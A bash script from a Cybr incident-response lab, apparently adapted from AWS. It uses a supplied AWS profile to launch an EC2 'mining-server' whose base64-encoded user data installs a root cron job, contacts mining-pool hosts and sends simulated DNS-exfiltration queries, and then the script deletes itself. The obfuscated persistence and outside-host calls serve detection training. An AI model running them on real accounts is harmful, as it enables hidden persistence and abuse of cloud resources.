# Modified by the Cybr team, but originally published by the AWS team with:
# MIT No Attribution
# 
# Copyright 2022 AWS
# 
# Permission is hereby granted, free of charge, to any person obtaining a copy of this
# software and associated documentation files (the "Software"), to deal in the Software
# without restriction, including without limitation the rights to use, copy, modify,
# merge, publish, distribute, sublicense, and/or sell copies of the Software, and to
# permit persons to whom the Software is furnished to do so.
# 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
# INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A
# PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
# HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION
# OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
# SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#
#!/bin/bash

# Arguments:
# - Profile: the AWS CLI profile to use to access credentials

# Scenario:
# - An access key was leaked. This is a fairly common issue: https://cloudsec.cybr.com/aws/incident-response/real-world-case-studies/
# - Access key grants access to a user who has admin access
# - Attacker enumerates basic VPC information
# - Attacker realizes they can launch EC2 instances
# - Attacker launches an EC2 instance and crypto mines from it
# (Hopefully) this triggers a detection alert which you then investigate
# You assume your SecurityAnalyst role and investigate with Athena. Refer to the course for next steps!

# Check if two arguments were provided
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <profile>"
    exit 1
fi

# Assign the provided arguments to variables
profile=$1

echo "Creating Resources for Simulation..."
echo "IyEvYmluL2Jhc2ggLXgKbWtkaXIgLXAgL3Vzci9jcnlwdG9raXQKdG91Y2ggL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaApjaG1vZCA3NTAgL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIjIS9iaW4vYmFzaCIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICJkaWcgZG9uYXRlLnYyLnhtcmlnLmNvbSIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICJkaWcgc3lzdGVtdGVuLm9yZyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICJkaWcgeG1yLnBvb2wubWluZXJnYXRlLmNvbWFjIiA+PiAvdXNyL2NyeXB0b2tpdC9wZXJzaXN0LnNoCmVjaG8gImRpZyBwb29sLm1pbmVyZ2F0ZS5jb20iID4+IC91c3IvY3J5cHRva2l0L3BlcnNpc3Quc2gKZWNobyAiZGlnIGRvY2tlcnVwZGF0ZS5hbm9uZG5zLm5ldCIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICJkaWcgcnNwY2Etbm9ydGhhbXB0b25zaGlyZS5vcmcudWsiID4+IC91c3IvY3J5cHRva2l0L3BlcnNpc3Quc2gKZWNobyAiZGlnIHhtcnBvb2wuZXUiID4+IC91c3IvY3J5cHRva2l0L3BlcnNpc3Quc2gKZWNobyAiZGlnIGNyeXB0b2ZvbGxvdy5jb20iID4+IC91c3IvY3J5cHRva2l0L3BlcnNpc3Quc2gKZWNobyAiZGlnIHhtci11c2EuZHdhcmZwb29sLmNvbSIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICJkaWcgeG1yLWV1LmR3YXJmcG9vbC5jb20iID4+IC91c3IvY3J5cHRva2l0L3BlcnNpc3Quc2gKZWNobyAiZGlnIHhtci1ldTEubmFub3Bvb2wub3JnIiA+PiAvdXNyL2NyeXB0b2tpdC9wZXJzaXN0LnNoCmVjaG8gImN1cmwgLXMgaHR0cDovL3Bvb2wubWluZXJnYXRlLmNvbS9ka2pkamtqZGxzYWpka2xqYWxzc2thamRrc2FramRrc2Fqa2xsYWxrZGpzYWxramRzYWxramRsa2FzaiAgPiAvZGV2L251bGwgJiIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICJjdXJsIC1zIGh0dHA6Ly94bXIucG9vbC5taW5lcmdhdGUuY29tL2RoZGhqa2hkamtoZGpraGFqa2hkanNrYWhoamtoamthaGRzamtha2phc2Roa2phaGRqayAgPiAvZGV2L251bGwgJiIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICJmb3IgaSBpbiB7MS4uMTB9OyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICJkbyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBDZ3BNYjNKbGJTQnBjSE4xYlNCa2IyeHZjaUJ6YVhRZ1lXMWxkQy5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyB3Z1kyOXVjMlZqZEdWMGRYSWdZV1JwY0dselkybHVaeUJsYkdsMC5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBMaUJXWlhOMGFXSjFiSFZ0SUdGaklISnBjM1Z6SUdSdmJHOXlMaS5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBCSmJpQmxkU0JwYlhCbGNtUnBaWFFnYldrc0lHbGtJSE5qWld4bC5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBjbWx6Y1hWbElHOXlZMmt1SUU1MWJHeGhiU0IxZENCc2FXSmxjbS5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyA4Z2NIVnlkWE11SUZCbGJHeGxiblJsYzNGMVpTQmhkQ0JtY21sdS5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBaMmxzYkdFZ2JXVjBkWE1zSUdGaklIVnNkSEpwWTJWeklHVnlZWC5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBRdUlFWjFjMk5sSUdOMWNuTjFjeUJ0YjJ4c2FYTWdjbWx6ZFhNZy5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBkWFFnZFd4MGNtbGphV1Z6TGlCT1lXMGdiV0Z6YzJFZ2FuVnpkRy5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyA4c0lIVnNkSEpwWTJsbGN5QmhkV04wYjNJZ2JXa2dkWFFzSUdScC5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBZM1IxYlNCc2IySnZjblJwY3lCdWRXeHNZUzRnVG5Wc2JHRWdjMi5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBsMElHRnRaWFFnWm1Wc2FYTWdibTl1SUdsd2MzVnRJSFpsYzNScC5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBZblZzZFcwZ2NtaHZibU4xY3k0Z1RHOXlaVzBnYVhCemRXMGdaRy5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyA5c2IzSWdjMmwwSUdGdFpYUXNJR052Ym5ObFkzUmxkSFZ5SUdGay5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBhWEJwYzJOcGJtY2daV3hwZEM0Z1NXNGdabUYxWTJsaWRYTWdhVy5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBRZ1pXeHBkQ0JoZENCdFlYaHBiWFZ6TGlCQmJHbHhkV0Z0SUdSaC5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBjR2xpZFhNZ2RYUWdiV0YxY21seklHNWxZeUJtWVhWamFXSjFjeS5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyA0Z1VISnZhVzRnWVhWamRHOXlJR3hwWW1WeWJ5QnVaV01nWVhWbi5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBkV1VnYzJGbmFYUjBhWE1nWTI5dVpHbHRaVzUwZFcwdUlGWmxjMy5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBScFluVnNkVzBnWW1saVpXNWtkVzBnYjJScGJ5QnhkV0Z0TENCaC5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBkQ0JqYjI1bmRXVWdiblZzYkdFZ2RtbDJaWEp5WVNCcGJpNGdTVy5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyA0Z2RXeDBjbWxqYVdWeklIUjFjbkJwY3lCaGRDQm1ZV05wYkdsei5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBhWE1nWkdsamRIVnRMaUJGZEdsaGJTQnVhWE5wSUdGdWRHVXNJRy5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBScFkzUjFiU0JsZENCb1pXNWtjbVZ5YVhRZ2JtVmpMQ0J6YjJSaC5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBiR1Z6SUdsa0lHVnliM011Q2dwUWFHRnpaV3hzZFhNZ1ptVjFaMi5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBsaGRDQnVkVzVqSUhObFpDQnpkWE5qYVhCcGRDQm1ZWFZqYVdKMS5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBjeTRnUVdWdVpXRnVJSFJwYm1OcFpIVnVkQ0J3YjNKMGRHbDBiMy5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBJZ2JtbHpiQ3dnZFhRZ1kzVnljM1Z6SUdabGJHbHpJSFp2YkhWMC5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBjR0YwSUhacGRHRmxMaUJOYjNKaWFTQnVaV01nYkdWdklIQjFiSC5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBacGJtRnlMQ0JoWTJOMWJYTmhiaUJ0WVhWeWFYTWdibVZqTENCai5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBiMjF0YjJSdklHMWhkWEpwY3k0Z1RtRnRJR052YlcxdlpHOGdaVy5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBkbGRDQmxibWx0SUdGMElHRnNhWEYxWVcwdUlGTjFjM0JsYm1ScC5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBjM05sSUdWblpYTjBZWE1nYldGemMyRWdhV1FnY21semRYTWdjRy5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBWc2JHVnVkR1Z6Y1hWbElIQnZjblIwYVhSdmNpQnVaV01nYm1Wai5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBJRzVsY1hWbExpQkRjbUZ6SUc1bFl5QnpaVzBnWVhKamRTNGdUbi5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBWc2JHRWdjWFZwY3lCellYQnBaVzRnYVc0Z2JHRmpkWE1nYkdGai5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBhVzVwWVNCMWJIUnlhV05sY3lCdFlYUjBhWE1nWlhRZ2NIVnlkWC5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBNdUlFNTFibU1nWm1WeWJXVnVkSFZ0SUc1bGNYVmxJR2xrSUc1MS5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBibU1nWW14aGJtUnBkQ0J0WVhocGJYVnpMaUJFZFdseklHVjFJSC5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBOdmJHeHBZMmwwZFdScGJpQnVkV3hzWVN3Z1lXTWdiV0YwZEdsei5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBJR0YxWjNWbExpQk5ZWFZ5YVhNZ2NYVnBjeUJqZFhKemRYTWdhWC5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBCemRXMHNJSEYxYVhNZ1puSnBibWRwYkd4aElITmxiUzRnVFc5eS5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBZbWtnYldGc1pYTjFZV1JoSUhOaGNHbGxiaUJ6WldRZ2JXVjBkWC5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBNZ1kyOXVkbUZzYkdsekxDQnphWFFnWVcxbGRDQmxkV2x6Ylc5ay5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBJR0YxWjNWbElIQmxiR3hsYm5SbGMzRjFaUzRnVFc5eVlta2dibS5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBsaWFDQmxjbUYwTENCd2IzTjFaWEpsSUhOcGRDQmhiV1YwSUdGai5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBZM1Z0YzJGdUlHNWxZeXdnYldGc1pYTjFZV1JoSUdFZ2JHVnZMZy5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBvS1JHOXVaV01nWlhVZ2NISmxkR2wxYlNCdlpHbHZMaUJCWlc1bC5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBZVzRnZEhKcGMzUnBjWFZsSUhGMVlXMGdkbVZzSUc5eVkya2dZVy5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyB4cGNYVmhiU3dnYm1WaklITmpaV3hsY21semNYVmxJRzUxYm1NZy5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBjM1Z6WTJsd2FYUXVJRVYwYVdGdElHVnNhWFFnYzJWdExDQjJhWC5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBabGNuSmhJRzVsWXlCbWNtbHVaMmxzYkdFZ2RtbDBZV1VzSUdWMS5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBhWE50YjJRZ2FXUWdkSFZ5Y0dsekxpQkpiblJsWjJWeUlIRjFhWC5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBNZ1pYSmhkQ0JsWjJWMElHRnlZM1VnZEdsdVkybGtkVzUwSUhCbC5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBiR3hsYm5SbGMzRjFaUzRnUTNWeVlXSnBkSFZ5SUhGMVlXMGdibi5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBWc2JHRXNJR3gxWTNSMWN5QjJaV3dnZG05c2RYUndZWFFnWldkbC5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBkQ3dnWkdGd2FXSjFjeUJsZENCdWRXNWpMaUJPZFc1aklIRjFhWC5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBNZ2JHbGlaWEp2SUdGc2FYRjFZVzBzSUdOdmJtUnBiV1Z1ZEhWdC5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBJR3AxYzNSdklIRjFhWE1zSUd4aFkybHVhV0VnYm1WeGRXVXVJRi5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBCeWIybHVJR1JoY0dsaWRYTWdaV3hwZENCaGRDQm9aVzVrY21WeS5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBhWFFnYldGNGFXMTFjeTRnVTJWa0lITmxiWEJsY2lCdWRXNWpJRy5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyAxaGMzTmhMQ0JsWjJWMElIQmxiR3hsYm5SbGMzRjFaU0JsYkdsMC5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICIgIGRpZyBJSE5oWjJsMGRHbHpJSE5sWkM0Zy5hZnNkZW0uY29tOyIgPj4gL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaAplY2hvICJkb25lIiA+PiAvdXNyL2NyeXB0b2tpdC9wZXJzaXN0LnNoCm9uZV9jYWxsPSQoL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaCkKdG91Y2ggL3Zhci9zcG9vbC9jcm9uL3Jvb3QKL3Vzci9iaW4vY3JvbnRhYiAvdmFyL3Nwb29sL2Nyb24vcm9vdAplY2hvICIqLzE1ICogKiAqICogL3Vzci9jcnlwdG9raXQvcGVyc2lzdC5zaCIgPj4gL3Zhci9zcG9vbC9jcm9uL3Jvb3QK" | base64 -d > ./output/userdata.txt

aws sts get-caller-identity --profile ${profile}
aws iam list-attached-user-policies --user-name Michael --profile ${profile}
export VPCID=$(aws ec2 describe-vpcs --query 'Vpcs[*].{VpcId:VpcId}' --output text --profile ${profile})
export SUBNETID=$(aws ec2 describe-subnets --filters "Name=tag:Application,Values=cybrlabsirec2crypto" --query "Subnets[*].SubnetId" --output text --profile ${profile})
aws ec2 describe-images --owners amazon --filters "Name=name,Values=amzn2-ami-hvm-2.0.*" "Name=state,Values=available" --query "reverse(sort_by(Images, &Name))[:1].ImageId" --region us-east-1 --profile ${profile} > ./output/AMI1.json
export AMI1=$(jq -r '.[]' AMI1.json)
ec2_output=$(aws ec2 run-instances --image-id ${AMI1} --instance-type t3.nano --count 1 --region us-east-1 --user-data file://output/userdata.txt --subnet-id ${SUBNETID} --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=mining-server}]' --profile ${profile})
echo "$ec2_output" >> ./output/log.txt
instance_id=$(echo $ec2_output | jq -r '.Instances[0].InstanceId')
echo "Instance ID: $instance_id"
echo "Resource Creation Complete"
echo "---"
#echo "Cleaning Up Files"
# rm userdata.txt
# rm AMI1.json
# rm log.txt
#echo "File Cleanup Complete"
#echo "---"
echo "End of Simulation Script"
rm -- "$0"